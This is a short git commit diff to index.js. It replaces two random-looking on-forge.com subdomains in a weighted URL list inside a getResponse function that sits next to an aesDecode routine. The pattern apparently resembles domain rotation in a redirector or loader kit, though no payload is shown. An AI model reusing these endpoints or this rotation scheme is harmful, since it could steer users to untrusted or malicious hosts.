f361dd14ed5e794b697a91a8f062abfa99f2c4a3
animalinside <akshay.anand12@yahoo.com>
2026-05-18 11:10:08 +0530

    Update index.js

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://5-gdsfglkfjsdlfjsdf.on-forge.com/", weight: 0.5 },
-        { url: "https://5-gdsfglkfjsdlfjsdf.on-forge.com/", weight: 0.5 }
+        { url: "https://6-6-6-6gfkjnsdflskdfnsdf.on-forge.com/", weight: 0.5 },
+        { url: "https://6-6-6-6gfkjnsdflskdfnsdf.on-forge.com/", weight: 0.5 }
       
     ];
 
